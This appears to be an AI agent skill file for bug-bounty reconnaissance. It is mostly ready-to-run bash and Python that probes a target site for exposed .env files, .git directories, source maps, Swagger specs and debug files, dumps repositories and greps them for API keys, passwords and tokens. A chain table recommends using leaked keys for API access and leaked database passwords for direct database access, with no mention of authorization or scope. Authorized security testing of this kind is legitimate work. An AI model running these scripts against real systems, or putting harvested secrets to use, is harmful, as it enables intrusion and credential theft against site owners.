---
name: hunt-source-leak
description: Hunt source code and build artifact leakage — JavaScript source maps (.js.map) reconstructing TypeScript/ES6 source, Swagger/OpenAPI JSON endpoint discovery, .env/.git exposure, webpack chunks with hardcoded secrets, robots.txt/security.txt recon, build-info files, asset-manifest.json API route discovery, .DS_Store file listing. Use at the START of every recon session — these findings often unlock the entire attack surface.
sources: hackerone_public, offensive_research
report_count: 31
---

# HUNT-SOURCE-LEAK — Source Code & Build Artifact Leakage

## Crown Jewel Targets

Source map exposing TypeScript source = see all API routes, auth logic, secrets. Swagger/OpenAPI JSON = complete API surface map.

**Highest-value findings:**
- **`.js.map` source maps** — reconstruct full TypeScript/ES6 source code → find hardcoded API keys, internal endpoints, auth logic bypasses
- **`swagger.json` / `openapi.json`** — complete REST API specification with all endpoints, parameters, auth schemes, and internal route names
- **`.env` / `.env.production`** — APP_KEY, DB_PASSWORD, API_KEY, SECRET_KEY in plaintext
- **`.git/` exposure** — `git clone` the entire source history → all past hardcoded secrets
- **`asset-manifest.json` / `_next/static/`** — all JS bundle paths → systematic source map discovery
- **`build-info` / `info.json`** — git commit hash, build timestamp, dependency versions → CVE targeting

---

## Phase 1 — Quick Wins (Run First)

```bash
# These 10 requests take <30 seconds and often yield Critical findings
for PATH in \
  "/.env" \
  "/.env.production" \
  "/.env.local" \
  "/.git/HEAD" \
  "/swagger.json" \
  "/api/swagger.json" \
  "/v1/swagger.json" \
  "/openapi.json" \
  "/api/openapi.json" \
  "/api-docs"; do
  STATUS=$(curl -s -o /tmp/sl_test -w "%{http_code}" "https://$TARGET$PATH")
  if [ "$STATUS" = "200" ]; then
    echo "[+] HIT: https://$TARGET$PATH"
    head -5 /tmp/sl_test
    echo "---"
  fi
done
```

---

## Phase 2 — Source Map Discovery

```bash
# Step 1: Get asset manifest to find all JS bundle paths
curl -s "https://$TARGET/asset-manifest.json" | python3 -m json.tool 2>/dev/null
curl -s "https://$TARGET/static/js/main.*.js" 2>/dev/null | head -3

# Next.js
BUILD_ID=$(curl -s https://$TARGET/ | grep -oP '"buildId":"\K[^"]+')
curl -s "https://$TARGET/_next/static/$BUILD_ID/_buildManifest.js" | head -5

# Step 2: For each JS bundle, check for source map reference at end of file
for JS_URL in $(curl -s https://$TARGET/ | grep -oP 'src="[^"]*\.js"' | sed 's/src="//;s/"//'); do
  LAST_LINE=$(curl -s "https://$TARGET$JS_URL" | tail -1)
  echo "$LAST_LINE" | grep -q "sourceMappingURL" && echo "[+] Source map: $JS_URL"
done

# Step 3: Download and reconstruct source from .map files
JS_URL="https://$TARGET/static/js/main.abc123.js"
MAP_URL="${JS_URL}.map"
curl -s "$MAP_URL" | python3 -c "
import sys, json, os
data = json.load(sys.stdin)
sources = data.get('sources', [])
contents = data.get('sourcesContent', [])
for i, (src, content) in enumerate(zip(sources, contents)):
    if content:
        path = '/tmp/sourcemap_extract/' + src.replace('../','').replace('./',''). replace('webpack://','')
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, 'w') as f:
            f.write(content)
        print(f'[+] Extracted: {src}')
"

# Step 4: Grep extracted source for secrets
grep -r "API_KEY\|SECRET\|PASSWORD\|TOKEN\|PRIVATE" /tmp/sourcemap_extract/ 2>/dev/null
grep -r "process\.env\." /tmp/sourcemap_extract/ 2>/dev/null | grep -v "NEXT_PUBLIC_" | head -20
grep -r "http://internal\|localhost\|127\.0\.0\.1\|10\.\|172\.\|192\.168" /tmp/sourcemap_extract/ 2>/dev/null | head -20
```

**Craft CMS targets**: When the target runs Craft CMS (detected via `X-Powered-By: Blitz`, `/cpresources/` in robots.txt, or `/actions/` URL convention), see `references/craft-cms-attack-surface.md` for the Craft-specific recon workflow — admin panel discovery, GraphQL endpoints, action controller probing, `.env` exposure, S3 asset bucket enumeration, Blitz cache poisoning, and Cloudflare interaction patterns. Craft sites have low JS-bundle secret yield (content-publishing, not SaaS); focus on PHP backend endpoints and S3 misconfig instead.

**Deep source map analysis**: Once source maps are downloaded, use `references/deep-sourcemap-analysis.md` for the full deep-analysis workflow — JSON parsing with `sourcesContent`, filtering `node_modules` noise from custom source, categorizing findings across 10 dimensions (endpoints, secrets, auth flow, 2FA, infrastructure, postMessage/CORS, env config, build path leaks), and avoiding source-map-specific false positives (server-injected keys, SDK variable references, sanitized innerHTML).

**Source map → bug candidate pivot**: After the inventory is done, the analysis is not finished — a source map is an attack-surface oracle, not a final bug. Use `references/source-map-to-bug-pivots.md` for the pivot workflow that converts inventory items into actionable pentest bug candidates, with triage guardrails (what is N/A standalone vs. chainable), a bug-oriented output table format, and the minimal live checks to run before drafting any report.

---

## Phase 3 — Swagger / OpenAPI Discovery

```bash
# Common paths
SWAGGER_PATHS=(
  "/swagger.json" "/swagger.yaml" "/swagger/"
  "/api/swagger.json" "/api/swagger.yaml"
  "/v1/swagger.json" "/v2/swagger.json" "/v3/swagger.json"
  "/openapi.json" "/openapi.yaml"
  "/api/openapi.json" "/api-docs" "/api-docs.json"
  "/api/v1/swagger.json" "/api/v2/swagger.json"
  "/rest/swagger.json" "/rest/api-docs"
  "/.well-known/openapi.json"
  "/graphql/schema.json"
)

for PATH in "${SWAGGER_PATHS[@]}"; do
  STATUS=$(curl -s -o /tmp/swagger_test -w "%{http_code}" "https://$TARGET$PATH")
  if [ "$STATUS" = "200" ]; then
    echo "[+] Found: https://$TARGET$PATH"
    # Extract all API paths from swagger
    python3 -c "
import sys, json
try:
    d = json.load(open('/tmp/swagger_test'))
    paths = list(d.get('paths', {}).keys())
    print(f'Endpoints: {len(paths)}')
    print('\n'.join(sorted(paths)))
except: pass
" | head -50
  fi
done
```

---

**Auth-infrastructure OpenAPI discovery:** Modern identity brokers (FastAPI, Keycloak, custom OAuth services) on dedicated auth subdomains (`auth.*`, `id.*`, `sso.*`, `p2-auth.*`) frequently expose `/openapi.json` on ALL environments (prod, dev, stg, disposable). This discloses admin/internal endpoints (`/admin/v1/users`, `/internal/cleanup`) that are IAP/auth-gated but provide a complete attack-map. Also check `/.well-known/jwks.json` — JWKS key IDs often leak environment names and rotation dates, and shared keys across environments indicate key-reuse risk. See `references/pulsepoint-exchange-aspnet-engagement.md` (hunt-aspnet) for a live example.

**ReadMe.io / hosted-docs recon:** When the docs site is hosted on ReadMe.io or another docs platform and common paths 404 or return HTML, the upstream OpenAPI spec often lives on the vendor's main domain (not the docs subdomain). Parse the docs page HTML for embedded spec URLs. See `references/readme-openapi-recon.md` for the full workflow — spec discovery, endpoint inventory by tag, auth extraction, SSRF-field identification, and rate-limit/webhook-signature gap analysis.

---

## Phase 4 — .git Exposure

```bash
# Check if .git directory is accessible
curl -s "https://$TARGET/.git/HEAD" | grep -q "ref:" && echo "[+] .git exposed!"

# High-signal proof points before dumping
curl -i "https://$TARGET/.git/config"
curl -s "https://$TARGET/.git/index" | xxd | head    # valid index starts with DIRC
curl -i "https://$TARGET/.git/logs/HEAD"
curl -i "https://$TARGET/.git/refs/heads/main"
curl -i "https://$TARGET/.git/packed-refs"

# If exposed, reconstruct repo
# Tool: git-dumper
python3 -m venv /tmp/gitdump
. /tmp/gitdump/bin/activate
pip install git-dumper
git-dumper "https://$TARGET/.git/" /tmp/dumped-repo/

# A partial dump is still reportable if HEAD/config/index/refs/logs are public
# and `git ls-files` reconstructs sensitive source-tree names.
cd /tmp/dumped-repo && \
  git ls-files | head -100 && \
  git log --all --oneline 2>/dev/null | head -20

# Grep for secrets in all git history (do not overclaim secrets unless retrieved)
cd /tmp/dumped-repo && \
  git grep -i "password\|secret\|api_key\|token" $(git rev-list --all) 2>/dev/null | head -30

# trufflehog on git history
trufflehog git file:///tmp/dumped-repo/ 2>/dev/null | head -50
```

Concrete exposed-Git + WordPress debug-log report recipe: `references/exposed-git-wordpress-myntra-pattern.md`.

When a CDN/WAF blocks live HTML/API fetches but archived artefacts are available, use `references/wayback-cdn-blocked-js-recon.md` to pull Wayback homepage snapshots, archived JS bundles, focused CDX `/api/*` data, and reconstruct API config maps safely.

**SPA `window.*` config leak + Wayback API endpoint enumeration**: Modern SPAs (Vue, React, Next.js, Nuxt) inject server-side config into `window.INITIAL_DATA` / `window.__*` script tags in the HTML `<head>` — leaking CDN domains, CDA/AFH routers, imgproxy URLs, forbidden endpoint lists, sduiConfig hashes, and third-party API keys. Pair this with Wayback CDX `/api/*` queries to passively enumerate the entire microservice API surface (MS-*, USER-SERVICE-API, internal/*, FREE-MONEY, PROXY-SERVICE-*) before any active probing triggers bot management. The reference also covers **JS bundle sub-module extraction** (fetching lazy-loaded `assets/*.js` modules to find endpoints hidden in auth/payment/game modules), **captcha differential testing** (registration prepare vs login captcha enforcement gaps), and **unauthenticated business logic endpoint testing** (bonus/raffle/exchange-rate endpoints that return real data without auth). See `references/spa-initial-data-and-wayback-api-enum.md` for the extraction workflow, high-signal key table, endpoint test patterns, and a 1win.com casino engagement example.

---

## Phase 5 — Forgotten Files & Debug Endpoints

### Runtime config files (`runtime-config.js` and similar)

Next.js and other SPA frameworks sometimes expose a root-level
`runtime-config.js` file that injects runtime configuration into a
`window.__*` global. This file is loaded via an inline `<script>` tag
(typically `(self.__next_s=self.__next_s||[]).push(["/runtime-config.js",{}])`)
and can contain backend URLs, Socket.IO paths/namespaces, public tokens,
feature flags, and cross-app embed-origin allowlists.

```bash
curl -sk "https://$TARGET/runtime-config.js"
# Also search HTML for the loader pattern
curl -sk "https://$TARGET/" | grep -oE 'runtime-config\.js|__.*CONFIG__|NEXT_PUBLIC_[A-Z0-9_]+'
```

Example leaked config:
```js
window.__CHAT_RUNTIME_CONFIG__ = {
  "NEXT_PUBLIC_CHAT_SERVER_URL": "",
  "NEXT_PUBLIC_CHAT_SOCKET_PATH": "",
  "NEXT_PUBLIC_CHAT_NAMESPACE": "",
  "NEXT_PUBLIC_CHAT_TOKEN": "",
  "NEXT_PUBLIC_CHAT_EMBED_PARENT_ORIGINS": "https://admin.target.example"
};
```

**Assessment:** Treat as an attack-surface map, not automatically a secret.
Follow `js-analysis-anti-false-positive` discipline. Report only if it
reveals a sensitive boundary (internal backend URL, cross-app trust
relationship) or enables a chain (SSRF target, token exchange endpoint,
embed origin bypass). Empty string values are placeholders, not secrets.

### Build artifacts and debug files
DEBUG_PATHS=(
  "/build-info.json" "/build/build-info.json"
  "/info" "/actuator/info" "/api/info"
  "/version" "/api/version" "/_version"
  "/health" "/status" "/ping"
  "/robots.txt" "/security.txt" "/.well-known/security.txt"
  "/sitemap.xml" "/manifest.json" "/browserconfig.xml"
  "/crossdomain.xml" "/clientaccesspolicy.xml"
  "/phpinfo.php" "/info.php" "/test.php"
  "/server-status" "/server-info" "/.htaccess"
  "/web.config" "/applicationHost.config"
  "/WEB-INF/web.xml" "/META-INF/MANIFEST.MF"
  "/package.json" "/composer.json" "/Gemfile"
  "/Dockerfile" "/docker-compose.yml" "/.dockerenv"
)

for PATH in "${DEBUG_PATHS[@]}"; do
  STATUS=$(curl -s -o /tmp/debug_test -w "%{http_code}" "https://$TARGET$PATH")
  if [ "$STATUS" = "200" ]; then
    echo "[+] Found: https://$TARGET$PATH ($STATUS, $(wc -c < /tmp/debug_test) bytes)"
    head -3 /tmp/debug_test
    echo "---"
  fi
done
```

---

## Phase 6 — .DS_Store File Listing

```bash
# .DS_Store files on macOS-deployed web servers reveal directory structure
curl -s "https://$TARGET/.DS_Store" | xxd | head -10

# Parse .DS_Store to extract filenames
pip3 install ds_store
python3 -c "
from ds_store import DSStore
with DSStore.open('/tmp/ds_store_test', 'r') as d:
    for entry in d:
        print(entry.filename)
"

# Recursive .DS_Store enumeration
# Tool: https://github.com/lijiejie/ds_store_exp
python3 ds_store_exp.py "https://$TARGET/"
```

---

## Phase 7 — webpack Chunk Analysis

```bash
# Download and analyze webpack chunks for hardcoded values
# Find chunk files
curl -s https://$TARGET/ | grep -oP '"[^"]*\.chunk\.js"' | tr -d '"' | while read chunk; do
  echo "Analyzing: $chunk"
  curl -s "https://$TARGET$chunk" | \
    grep -oE '"(api_key|apiKey|secret|password|token|key)"\s*:\s*"[^"]+"' | head -5
done

# Also grep for internal hostnames
curl -s "https://$TARGET/static/js/main.*.js" | \
  grep -oE '"(https?://[^"]*internal[^"]*|http://[^"]*localhost[^"]*)"' | sort -u

# Check for Base64-encoded secrets
curl -s "https://$TARGET/static/js/main.*.js" | \
  grep -oP '"[A-Za-z0-9+/]{30,}={0,2}"' | while read b64; do
  DECODED=$(echo "$b64" | tr -d '"' | base64 -d 2>/dev/null)
  echo "$DECODED" | grep -iE "key|secret|password|token" && echo "  B64: $b64"
done
```

---

## Chain Table

| Source leak finding | Chain to | Impact |
|--------------------|----------|--------|
| Source map with API key | Use key directly → API access | High/Critical |
| Source map with auth logic | Find auth bypass route | Critical |
| Swagger → internal endpoints | Test undocumented admin routes | High |
| .git exposed | Full source history → all past secrets | Critical |
| build-info with git hash | CVE targeting exact version | High |
| .env with DB_PASSWORD | Direct database access | Critical |

---

## Tools

```bash
# git-dumper (reconstruct exposed .git)
pip3 install git-dumper
git-dumper "https://target.com/.git/" /tmp/repo/

# sourcemap-explorer (visualize what's in bundles)
npm install -g source-map-explorer
source-map-explorer main.js

# unwebpack-sourcemap (extract all source files)
npm install -g unwebpack-sourcemap

# trufflehog (secret scanning)
trufflehog filesystem /tmp/repo/
```

---

## Validation

✅ Source map: reconstructed TypeScript source contains API endpoints or hardcoded secrets
✅ Swagger: JSON contains internal endpoints not visible in UI
✅ .git exposed: git-dumper successfully clones repo, secrets in history
✅ .env exposed: DATABASE_URL, API_KEY, SECRET_KEY visible in plaintext

**Severity:**
- .env with credentials: Critical
- .git with secrets in history: Critical
- Source map with secrets: High
- Swagger with internal routes: Medium-High
- robots.txt only: Informational
